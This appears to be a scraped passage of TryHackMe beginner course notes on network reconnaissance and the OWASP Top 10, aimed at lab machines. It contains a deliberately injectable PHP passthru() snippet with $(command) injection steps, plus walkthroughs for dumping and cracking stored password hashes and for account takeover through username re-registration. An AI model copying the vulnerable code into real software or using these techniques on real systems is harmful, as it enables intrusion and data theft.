User-Agent Switcher and Manager gives you the ability to pretend to be accessing the webpage from a different operating system or different web browser. In other words, you can pretend to be browsing a site using an iPhone when in fact, you are accessing it from Mozilla Firefox. You can download User-Agent Switcher and Manager for Firefox here.
Wappalyzer provides insights about the technologies used on the visited websites. Such extension is handy, primarily when you collect all this information while browsing the website like any other user. A screenshot of Wappalyzer is shown below. You can find Wappalyzer for Firefox here.</p>
<p>Over time, you might find a few extensions that fit perfectly in your workflow.</p>
<p>Ping should remind you of the game ping-pong (table tennis). You throw the ball and expect to get it back. The primary purpose of ping is to check whether you can reach the remote system and that the remote system can reach you back. In other words, initially, this was used to check network connectivity; however, we are more interested in its different uses: checking whether the remote system is online.</p>
<p>In simple terms, the ping command sends a packet to a remote system, and the remote system replies. This way, you can conclude that the remote system is online and that the network is working between the two systems.</p>
<p>If you prefer a pickier definition, the ping is a command that sends an ICMP Echo packet to a remote system. If the remote system is online, and the ping packet was correctly routed and not blocked by any firewall, the remote system should send back an ICMP Echo Reply. Similarly, the ping reply should reach the first system if appropriately routed and not blocked by any firewall.</p>
<p>The objective of such a command is to ensure that the target system is online before we spend time carrying out more detailed scans to discover the running operating system and services.</p>
<p>On your AttackBox terminal, you can start to use ping as ping MACHINE_IP or ping HOSTNAME. In the latter, the system needs to resolve HOSTNAME to an IP address before sending the ping packet. If you don’t specify the count on a Linux system, you will need to hit CTRL+c to force it to stop. Hence, you might consider ping -c 10 MACHINE_IP if you just want to send ten packets. This is equivalent to ping -n 10 MACHINE_IP on a MS Windows system.</p>
<p>Technically speaking, ping falls under the protocol ICMP (Internet Control Message Protocol). ICMP supports many types of queries, but, in particular, we are interested in ping (ICMP echo/type 8) and ping reply (ICMP echo reply/type 0). Getting into ICMP details is not required to use ping.</p>
<p>In the following example, we have specified the total count of packets to 5. From the AttackBox’s terminal, we started pinging MACHINE_IP. We learned that MACHINE_IP is up and is not blocking ICMP echo requests. Moreover, any firewalls and routers on the packet route are not blocking ICMP echo requests either.</p>
<p>AttackBox Terminal
user@AttackBox$ ping -c 5 MACHINE_IP
PING MACHINE_IP (MACHINE_IP) 56(84) bytes of data.
64 bytes from MACHINE_IP: icmp_seq=1 ttl=64 time=0.636 ms
64 bytes from MACHINE_IP: icmp_seq=2 ttl=64 time=0.483 ms
64 bytes from MACHINE_IP: icmp_seq=3 ttl=64 time=0.396 ms
64 bytes from MACHINE_IP: icmp_seq=4 ttl=64 time=0.416 ms
64 bytes from MACHINE_IP: icmp_seq=5 ttl=64 time=0.445 ms</p>
<p>--- MACHINE_IP ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4097ms
rtt min/avg/max/mdev = 0.396/0.475/0.636/0.086 ms
In the example above, we saw clearly that the target system is responding. The ping output is an indicator that it is online and reachable. We have transmitted five packets, and we received five replies. We notice that, on average, it took 0.475 ms (millisecond) for the reply to reach our system, with the maximum being 0.636 ms.</p>
<p>From a penetration testing point of view, we will try to discover more about this target. We will try to learn as much as possible, for example, which ports are open and which services are running.</p>
<p>Let’s consider the following case: we shut down the target virtual machine and then tried to ping MACHINE_IP. As you would expect in the following example, we don’t receive any reply.</p>
<p>AttackBox Terminal
user@AttackBox$ ping -c 5 MACHINE_IP
PING MACHINE_IP (MACHINE_IP) 56(84) bytes of data.
From ATTACKBOX_IP icmp_seq=1 Destination Host Unreachable
From ATTACKBOX_IP icmp_seq=2 Destination Host Unreachable
From ATTACKBOX_IP icmp_seq=3 Destination Host Unreachable
From ATTACKBOX_IP icmp_seq=4 Destination Host Unreachable
From ATTACKBOX_IP icmp_seq=5 Destination Host Unreachable</p>
<p>--- MACHINE_IP ping statistics ---
5 packets transmitted, 0 received, +5 errors, 100% packet loss, time 4098ms
pipe 4
In this case, we already know that we have shut down the target computer that has MACHINE_IP. For each ping, the system we are using, AttackBox in this case, is responding with “Destination Host Unreachable.” We can see that we have transmitted five packets, but none was received, resulting in a 100% packet loss.</p>
<p>Generally speaking, when we don’t get a ping reply back, there are a few explanations that would explain why we didn’t get a ping reply, for example:</p>
<p>The destination computer is not responsive; possibly still booting up or turned off, or the OS has crashed.
It is unplugged from the network, or there is a faulty network device across the path.
A firewall is configured to block such packets. The firewall might be a piece of software running on the system itself or a separate network appliance. Note that MS Windows firewall blocks ping by default.
Your system is unplugged from the network.</p>
<p>As the name suggests, the traceroute command traces the route taken by the packets from your system to another host. The purpose of a traceroute is to find the IP addresses of the routers or hops that a packet traverses as it goes from your system to a target host. This command also reveals the number of routers between the two systems. It is helpful as it indicates the number of hops (routers) between your system and the target host. However, note that the route taken by the packets might change as many routers use dynamic routing protocols that adapt to network changes.</p>
<p>On Linux and macOS, the command to use is traceroute 10.10.84.142, and on MS Windows, it is tracert 10.10.84.142. traceroute tries to discover the routers across the path from your system to the target system.</p>
<p>There is no direct way to discover the path from your system to a target system. We rely on ICMP to “trick” the routers into revealing their IP addresses. We can accomplish this by using a small Time To Live (TTL) in the IP header field. Although the T in TTL stands for time, TTL indicates the maximum number of routers/hops that a packet can pass through before being dropped; TTL is not a maximum number of time units. When a router receives a packet, it decrements the TTL by one before passing it to the next router. The following figure shows that each time the IP packet passes through a router, its TTL value is decremented by 1. Initially, it leaves the system with a TTL value of 64; it reaches the target system with a TTL value of 60 after passing through 4 routers.</p>
<p>However, if the TTL reaches 0, it will be dropped, and an ICMP Time-to-Live exceeded would be sent to the original sender. In the following figure, the system set TTL to 1 before sending it to the router. The first router on the path decrements the TTL by 1, resulting in a TTL of 0. Consequently, this router will discard the packet and send an ICMP time exceeded in-transit error message. Note that some routers are configured not to send such ICMP messages when discarding a packet.</p>
<p>On Linux, traceroute will start by sending UDP datagrams within IP packets of TTL being 1. Thus, it causes the first router to encounter a TTL=0 and send an ICMP Time-to-Live exceeded back. Hence, a TTL of 1 will reveal the IP address of the first router to you. Then it will send another packet with TTL=2; this packet will be dropped at the second router. And so on. Let’s try this on live systems.</p>
<p>In the following examples, we run the same command, traceroute tryhackme.com from TryHackMe’s AttackBox. We notice that different runs might lead to different routes taken by the packets.</p>

In the traceroute output above, we have 14 numbered lines; each line represents one router/hop. Our system sends three packets with TTL set to 1, then three packets with TTL set to 2, and so forth. Depending on the network topology, we might get replies from up to 3 different routers, depending on the route taken by the packet. Consider line number 12, the twelfth router with the listed IP address has dropped the packet three times and sent an ICMP time exceeded in-transit message. The line 12 99.83.69.207 (99.83.69.207) 17.603 ms 15.827 ms 17.351 ms shows the time in milliseconds for each reply to reach our system.</p>
<p>On the other hand, we can see that we received only a single reply on the third line. The two stars in the output 3 * 100.66.16.176 (100.66.16.176) 8.006 ms * indicate that our system didn’t receive two expected ICMP time exceeded in-transit messages.</p>
<p>Finally, in the first line of the output, we can see that the packets leaving the AttackBox take different routes. We can see two routers that responded to TTL being one. Our system never received the third expected ICMP message.</p>

In the second run of the traceroute program, we noticed that the packets took a longer route this time, passing through 26 routers. If you are running a traceroute to a system within your network, the route will be unlikely to change. However, we cannot expect the route to remain fixed when the packets need to go via other routers outside our network.</p>
<p>To summarize, we can notice the following:</p>
<p>The number of hops/routers between your system and the target system depends on the time you are running traceroute. There is no guarantee that your packets will always follow the same route, even if you are on the same network or you repeat the traceroute command within a short time.
Some routers return a public IP address. You might examine a few of these routers based on the scope of the intended penetration testing.
Some routers don’t return a reply.</p>
<p>The TELNET (Teletype Network) protocol was developed in 1969 to communicate with a remote system via a command-line interface (CLI). Hence, the command telnet uses the TELNET protocol for remote administration. The default port used by telnet is 23. From a security perspective, telnet sends all the data, including usernames and passwords, in cleartext. Sending in cleartext makes it easy for anyone, who has access to the communication channel, to steal the login credentials. The secure alternative is SSH (Secure SHell) protocol.</p>
<p>However, the telnet client, with its simplicity, can be used for other purposes. Knowing that telnet client relies on the TCP protocol, you can use Telnet to connect to any service and grab its banner. Using telnet 10.10.84.142 PORT, you can connect to any service running on TCP and even exchange a few messages unless it uses encryption.</p>
<p>Let’s say we want to discover more information about a web server, listening on port 80. We connect to the server at port 80, and then we communicate using the HTTP protocol. You don’t need to dive into the HTTP protocol; you just need to issue GET / HTTP/1.1. To specify something other than the default index page, you can issue GET /page.html HTTP/1.1, which will request page.html. We also specified to the remote web server that we want to use HTTP version 1.1 for communication. To get a valid response, instead of an error, you need to input some value for the host host: example and hit enter twice. Executing these steps will provide the requested index page.</p>

Of particular interest for us is discovering the type and version of the installed web server, Server: nginx/1.6.2. In this example, we communicated with a web server, so we used basic HTTP commands. If we connect to a mail server, we need to use proper commands based on the protocol, such as SMTP and POP3.</p>
<p>Netcat or simply nc has different applications that can be of great value to a pentester. Netcat supports both TCP and UDP protocols. It can function as a client that connects to a listening port; alternatively, it can act as a server that listens on a port of your choice. Hence, it is a convenient tool that you can use as a simple client or server over TCP or UDP.</p>
<p>First, you can connect to a server, as you did with Telnet, to collect its banner using nc 10.10.84.142 PORT, which is quite similar to our previous telnet 10.10.84.142 PORT. Note that you might need to press SHIFT+ENTER after the GET line.</p>
<p>Pentester Terminal

In the terminal shown above, we used netcat to connect to 10.10.84.142 port 80 using nc 10.10.84.142 80. Next, we issued a get for the default page using GET / HTTP/1.1; we are specifying to the target server that our client supports HTTP version 1.1. Finally, we need to give a name to our host, so we added on a new line, host: netcat; you can name your host anything as this has no impact on this exercise.</p>
<p>Based on the output Server: nginx/1.6.2 we received, we can tell that on port 80, we have Nginx version 1.6.2 listening for incoming connections.</p>
<p>You can use netcat to listen on a TCP port and connect to a listening port on another system.</p>
<p>On the server system, where you want to open a port and listen on it, you can issue nc -lp 1234 or better yet, nc -vnlp 1234, which is equivalent to nc -v -l -n -p 1234, as you would remember from the Linux room. The exact order of the letters does not matter as long as the port number is preceded directly by -p.</p>
<p>option	meaning
-l	Listen mode
-p	Specify the Port number
-n	Numeric only; no resolution of hostnames via DNS
-v	Verbose output (optional, yet useful to discover any bugs)
-vv	Very Verbose (optional)
-k	Keep listening after client disconnects
Notes:</p>
<p>the option -p should appear just before the port number you want to listen on.
the option -n will avoid DNS lookups and warnings.
port numbers less than 1024 require root privileges to listen on.
On the client-side, you would issue nc 10.10.84.142 PORT_NUMBER. Here is an example of using nc to echo. After you successfully establish a connection to the server, whatever you type on the client-side will be echoed on the server-side and vice versa.</p>
<p>Consider the following example. On the server-side, we will listen on port 1234. We can achieve this with the command nc -vnlp 1234 (same as nc -lvnp 1234). In our case, the listening server has the IP address 10.10.84.142, so we can connect to it from the client-side by executing nc 10.10.84.142 1234. This setup would echo whatever you type on one side to the other side of the TCP tunnel. You can find a recording of the process below. Note that the listening server is on the left side of the screen.</p>

<p>This room breaks each OWASP topic down and includes details on the vulnerabilities, how they occur, and how you can exploit them. You will put the theory into practice by completing supporting challenges.</p>
<p>Broken Access Control
Cryptographic Failures
Injection
Insecure Design
Security Misconfiguration
Vulnerable and Outdated Components
Identification and Authentication Failures
Software and Data Integrity Failures
Security Logging &amp; Monitoring Failures
Server-Side Request Forgery (SSRF)
The room has been designed for beginners and assumes no previous security knowledge.</p>
<p>Websites have pages that are protected from regular visitors. For example, only the site's admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are broken.</p>
<p>A regular visitor being able to access protected pages can lead to the following:</p>
<p>Being able to view sensitive information from other users
Accessing unauthorized functionality
Simply put, broken access control allows attackers to bypass authorisation, allowing them to view sensitive data or perform tasks they aren't supposed to.</p>
<p>For example, a vulnerability was found in 2019, where an attacker could get any single frame from a Youtube video marked as private. The researcher who found the vulnerability showed that he could ask for several frames and somewhat reconstruct the video. Since the expectation from a user when marking a video as private would be that nobody had access to it, this was indeed accepted as a broken access control vulnerability.</p>
<p>Insecure Direct Object Reference</p>
<p>IDOR or Insecure Direct Object Reference refers to an access control vulnerability where you can access resources you wouldn't ordinarily be able to see. This occurs when the programmer exposes a Direct Object Reference, which is just an identifier that refers to specific objects within the server. By object, we could mean a file, a user, a bank account in a banking application, or anything really.</p>
<p>For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://bank.thm/account?id=111111. On that page, we can see all our important bank details, and a user would do whatever they need to do and move along their way, thinking nothing is wrong.</p>
<p>There is, however, a potentially huge problem here, anyone may be able to change the id parameter to something else like 222222, and if the site is incorrectly configured, then he would have access to someone else's bank information.</p>
<p>The application exposes a direct object reference through the id parameter in the URL, which points to specific accounts. Since the application isn't checking if the logged-in user owns the referenced account, an attacker can get sensitive information from other users because of the IDOR vulnerability. Notice that direct object references aren't the problem, but rather that the application doesn't validate if the logged-in user should have access to the requested account.</p>
<p>Cryptographic Failures</p>
<p>A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.</p>
<p>Take, for example, a secure email application:</p>
<p>When you are accessing your email account using your browser, you want to be sure that the communications between you and the server are encrypted. That way, any eavesdropper trying to capture your network packets won't be able to recover the content of your email addresses. When we encrypt the network traffic between the client and server, we usually refer to this as encrypting data in transit.
Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can't read their client's emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as encrypting data at rest.
Cryptographic failures often end up in web apps accidentally divulging sensitive data. This is often data directly linked to customers (e.g. names, dates of birth, financial information), but it could also be more technical information, such as usernames and passwords.</p>
<p>At more complex levels, taking advantage of some cryptographic failures often involves techniques such as &quot;Man in The Middle Attacks&quot;, whereby the attacker would force user connections through a device they control. Then, they would take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted in the first place). Of course, many examples are much simpler, and vulnerabilities can be found in web apps that can be exploited without advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the web server itself.</p>
<p>The web application in this box contains one such vulnerability. To continue, read through the supporting material in the following tasks.</p>
<p>The most common way to store a large amount of data in a format easily accessible from many locations is in a database. This is perfect for something like a web application, as many users may interact with the website at any time. Database engines usually follow the Structured Query Language (SQL) syntax.</p>
<p>In a production environment, it is common to see databases set up on dedicated servers running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These are referred to as &quot;flat-file&quot; databases, as they are stored as a single file on the computer. This is much easier than setting up an entire database server and could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.</p>
<p>As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually, this would not be a problem for a web app, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files accessible to the user connecting to the website)? Well, we can download and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure, indeed!</p>
<p>That is a big hint for the challenge, so let's briefly cover some of the syntax we would use to query a flat-file database.</p>
<p>The most common (and simplest) format of a flat-file database is an SQLite database. These can be interacted with in most programming languages and have a dedicated client for querying them on the command line. This client is called sqlite3 and is installed on many Linux distributions by default.</p>
<p>Let's suppose we have successfully managed to download a database:</p>
<p>Linux
user@linux$ ls -l 
-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db</p>
<p>user@linux$ file example.db 
example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1
We can see that there is an SQLite database in the current folder.</p>
<p>To access it, we use sqlite3 <database-name>:</p>
<p>Linux
user@linux$ sqlite3 example.db<br />
SQLite version 3.39.2 2022-07-21 15:24:47
Enter &quot;.help&quot; for usage hints.
sqlite&gt; 
From here, we can see the tables in the database by using the .tables command:</p>
<p>Linux
user@linux$ sqlite3 example.db<br />
SQLite version 3.39.2 2022-07-21 15:24:47
Enter &quot;.help&quot; for usage hints.
sqlite&gt; .tables
customers
At this point, we can dump all the data from the table, but we won't necessarily know what each column means unless we look at the table information. First, let's use PRAGMA table_info(customers); to see the table information. Then we'll use SELECT * FROM customers; to dump the information from the table:</p>
<p>Linux
sqlite&gt; PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0</p>
<p>sqlite&gt; SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
We can see from the table information that there are four columns: custID, custName, creditCard and password. You may notice that this matches up with the results. Take the first row:</p>
<p>0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99</p>
<p>We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).</p>
<p>In the next task, we'll look at cracking this hash.</p>
<p>We saw how to query an SQLite database for sensitive data in the previous task. We found a collection of password hashes, one for each user. In this task, we will briefly cover how to crack these.</p>
<p>When it comes to hash cracking, Kali comes pre-installed with various tools. If you know how to use these, then feel free to do so; however, they are outwith the scope of this material.</p>
<p>Instead, we will be using the online tool: Crackstation. This website is extremely good at cracking weak password hashes. For more complicated hashes, we would need more sophisticated tools; however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely.</p>
<p>When we navigate to the website, we are met with the following interface:</p>
<p>Crackstation</p>
<p>Let's try pasting the password hash for Joy Paulson, which we found in the previous task (5f4dcc3b5aa765d61d8327deb882cf99). We solve the Captcha, then click the &quot;Crack Hashes&quot; button:</p>
<p>Cracked Password</p>
<p>We see that the hash was successfully broken, and the user's password was &quot;password&quot;. How secure!</p>
<p>It's worth noting that Crackstation works using a massive wordlist. If the password is not in the wordlist, then Crackstation will not be able to break the hash.</p>
<p>The challenge is guided, so if Crackstation fails to break a hash in today's box, you can assume that the hash has been specifically designed not to be crackable.</p>
<pre><code class="language-bash">sqlite3 example.db
&gt; pragma table_info(users);
</code></pre>
<p>Injection</p>
<p>Injection flaws are very common in applications today. These flaws occur because the application interprets user-controlled input as commands or parameters. Injection attacks depend on what technologies are used and how these technologies interpret the input. Some common examples include:</p>
<p>SQL Injection: This occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries. This would mean an attacker could steal sensitive information such as personal details and credentials.
Command Injection: This occurs when user input is passed to system commands. As a result, an attacker can execute arbitrary system commands on application servers, potentially allowing them to access users' systems.
The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:</p>
<p>Using an allow list: when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.
Stripping input: If the input contains dangerous characters, these are removed before processing.
Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or stripping input, various libraries exist that can perform these actions for you.</p>
<p>Command Injection</p>
<p>Command Injection occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server's console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted, just as if they were sitting in front of the server and issuing commands directly into the command line. </p>
<p>Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and look for ways to pivot around.</p>
<p>Code Example</p>
<p>Let's consider a scenario: MooCorp has started developing a web-based application for cow ASCII art with customisable text. While searching for ways to implement their app, they've come across the cowsay command in Linux, which does just that! Instead of coding a whole web application and the logic required to make cows talk in ASCII, they decide to write some simple code that calls the cowsay command from the operating system's console and sends back its contents to the website.</p>
<p>Let's look at the code they used for their app.  See if you can determine why their implementation is vulnerable to command injection.  We'll go over it below.</p>
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
<p>In simple terms, the above snippet does the following:</p>
<p>Checking if the parameter &quot;mooing&quot; is set. If it is, the variable $mooing gets what was passed into the input field.
Checking if the parameter &quot;cow&quot; is set. If it is, the variable $cow gets what was passed through the parameter.
The program then executes the function passthru(&quot;perl /usr/bin/cowsay -f $cow $mooing&quot;);. The passthru function simply executes a command in the operating system's console and sends the output back to the user's browser. You can see that our command is formed by concatenating the $cow and $mooing variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks. If you want to, you can read the docs on passthru() on PHP's website for more information on the function itself.
Command Injection</p>
<p>Exploiting Command Injection</p>
<p>Now that we know how the application works behind the curtains, we will take advantage of a bash feature called &quot;inline commands&quot; to abuse the cowsay server and execute any arbitrary command we want. Bash allows you to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed.</p>
<p>To execute inline commands, you only need to enclose them in the following format $(your_command_here). If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command. Look at the following example, which runs whoami as an inline command inside an echo command:</p>
<p>Inline commands</p>
<p>So coming back to the cowsay server, here's what would happen if we send an inline command to the web application:</p>
<p>Sending our payload</p>
<p>Since the application accepts any input from us, we can inject an inline command which will get executed and used as a parameter for cowsay. This will make our cow say whatever the command returns! In case you are not that familiar with Linux, here are some other commands you may want to try:</p>
<p>whoami
id
ifconfig/ip addr
uname -a
ps -ef
To complete the questions below, navigate to http://10.10.54.213:82/ and exploit the cowsay server.</p>
<p>Insecure Design</p>
<p>Insecure design refers to vulnerabilities which are inherent to the application's architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start. Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to your final app. Some other times, insecure design vulnerabilities may also be introduced by developers while adding some &quot;shortcuts&quot; around the code to make their testing easier. A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production.</p>
<p>Insecure Password Resets</p>
<p>A good example of such vulnerabilities occurred on Instagram a while ago. Instagram allowed users to reset their forgotten passwords by sending them a 6-digit code to their mobile number via SMS for validation. If an attacker wanted to access a victim's account, he could try to brute-force the 6-digit code. As expected, this was not directly possible as Instagram had rate-limiting implemented so that after 250 attempts, the user would be blocked from trying further.</p>
<p>Bruteforcing code</p>
<p>However, it was found that the rate-limiting only applied to code attempts made from the same IP. If an attacker had several different IP addresses from where to send requests, he could now try 250 codes per IP. For a 6-digit code, you have a million possible codes, so an attacker would need 1000000/250 = 4000 IPs to cover all possible codes. This may sound like an insane amount of IPs to have, but cloud services make it easy to get them at a relatively small cost, making this attack feasible.</p>
<p>Distributed bruteforcing</p>
<p>Notice how the vulnerability is related to the idea that no user would be capable of using thousands of IP addresses to make concurrent requests to try and brute-force a numeric code. The problem is in the design rather than the implementation of the application in itself.</p>
<p>Since insecure design vulnerabilities are introduced at such an early stage in the development process, resolving them often requires rebuilding the vulnerable part of the application from the ground up and is usually harder to do than any other simple code-related vulnerability. The best approach to avoid such vulnerabilities is to perform threat modelling at the early stages of the development lifecycle. To get more information on how to implement secure development lifecycles, be sure to check out the SSDLC room.</p>
<p>Practical Example</p>
<p>Navigate to http://10.10.54.213:85 and get into joseph's account. This application also has a design flaw in its password reset mechanism. Can you figure out the weakness in the proposed design and how to abuse it?</p>
<p>Security Misconfiguration</p>
<p>Security Misconfigurations are distinct from the other Top 10 vulnerabilities because they occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.</p>
<p>Security misconfigurations include:</p>
<p>Poorly configured permissions on cloud services, like S3 buckets.
Having unnecessary features enabled, like services, pages, accounts or privileges.
Default accounts with unchanged passwords.
Error messages that are overly detailed and allow attackers to find out more about the system.
Not using HTTP security headers.
This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XML External Entities (XXE) or command injection on admin pages.</p>
<p>For more info, look at the OWASP top 10 entry for Security Misconfiguration.</p>
<p>Debugging Interfaces</p>
<p>A common security misconfiguration concerns the exposure of debugging features in production software. Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging an application while it's being developed. Attackers could abuse some of those debug functionalities if somehow, the developers forgot to disable them before publishing their applications.</p>
<p>One example of such a vulnerability was allegedly used when Patreon got hacked in 2015. Five days before Patreon was hacked, a security researcher reported to Patreon that he had found an open debug interface for a Werkzeug console. Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed either via URL on /console, or it will also be presented to the user if an exception is raised by the application. In both cases, the console provides a Python console that will run any code you send to it. For an attacker, this means he can execute commands arbitrarily.</p>
<p>Werkzeug console</p>
<p>Practical example</p>
<p>This VM showcases a Security Misconfiguration as part of the OWASP Top 10 Vulnerabilities list.</p>
<p>Navigate to http://10.10.54.213:86 and try to exploit the security misconfiguration to read the application's source code.</p>
<p>Vulnerable and Outdated Components</p>
<p>Occasionally, you may find that the company/entity you're pen-testing is using a program with a well-known vulnerability.</p>
<p>For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as WPScan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better, you can find an exploit already made on Exploit-DB.</p>
<p>As you can see, this would be quite devastating because it requires very little work on the attacker's part. Since the vulnerability is already well known, someone else has likely made an exploit for the vulnerability already. The situation worsens when you realise that it's really easy for this to happen. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.</p>
<p>Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, and the server would verify them. The server would then provide the users' browser with a session cookie if they are correct. A session cookie is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of users' actions. </p>
<p>If an attacker is able to find flaws in an authentication mechanism, they might successfully gain access to other users' accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include the following:</p>
<p>Brute force attacks: If a web application uses usernames and passwords, an attacker can try to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. 
Use of weak credentials: Web applications should set strong password policies. If applications allow users to set passwords such as &quot;password1&quot; or common passwords, an attacker can easily guess them and access user accounts.
Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, attackers can set their own session cookies and access users' accounts. 
There can be various mitigation for broken authentication mechanisms depending on the exact flaw:</p>
<p>To avoid password-guessing attacks, ensure the application enforces a strong password policy. 
To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute-force attacks.
Implement Multi-Factor Authentication. If a user has multiple authentication methods, for example, using a username and password and receiving a code on their mobile device, it would be difficult for an attacker to get both the password and the code to access the account.</p>
<p>For this example, we'll look at a logic flaw within the authentication mechanism.</p>
<p>Many times, what happens is that developers forget to sanitise the input(username &amp; password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we will focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit, i.e. re-registration of an existing user.</p>
<p>Let's understand this with the help of an example, say there is an existing user with the name admin, and we want access to their account, so what we can do is try to re-register that username but with slight modification. We will enter &quot; admin&quot; without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user admin.</p>
<p>To see this in action, go to http://10.10.54.213:8088 and try to register with darren as your username. You'll see that the user already exists, so try to register &quot; darren&quot; instead, and you'll see that you are now logged in and can see the content present only in darren's account, which in our case, is the flag that you need to retrieve.</p>
<p>What is Integrity?</p>
<p>When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified. Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications. For example, say you are downloading the latest installer for an application. How can you be sure that while downloading it, it wasn't modified in transit or somehow got damaged by a transmission error?</p>
<p>To overcome this problem, you will often see a hash sent alongside the file so that you can prove that the file you downloaded kept its integrity and wasn't modified in transit. A hash or digest is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about MD5, SHA1, SHA256 or many others available.</p>
<p>Let's take WinSCP as an example to understand better how we can use hashes to check a file's integrity. If you go to their Sourceforge repository, you'll see that for each file available to download, there are some hashes published along:</p>
<p>WinSCP hashes</p>
<p>These hashes were precalculated by the creators of WinSCP so that you can check the file's integrity after downloading. If we download the WinSCP-5.21.5-Setup.exe file, we can recalculate the hashes and compare them against the ones published in Sourceforge. To calculate the different hashes in Linux, we can use the following commands:</p>
<p>AttackBox
user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe<br />
20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe</p>
<p>user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe</p>
<p>user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
Since we got the same hashes, we can safely conclude that the file we downloaded is an exact copy of the one on the website.</p>
<p>Software and Data Integrity Failures</p>
<p>This vulnerability arises from code or infrastructure that uses software or data without using any kind of integrity checks. Since no integrity verification is being done, an attacker might modify the software or data passed to the application, resulting in unexpected consequences. There are mainly two types of vulnerabilities in this category:</p>
<p>Software Integrity Failures
Data Integrity Failures</p>
<p>Software Integrity Failures</p>
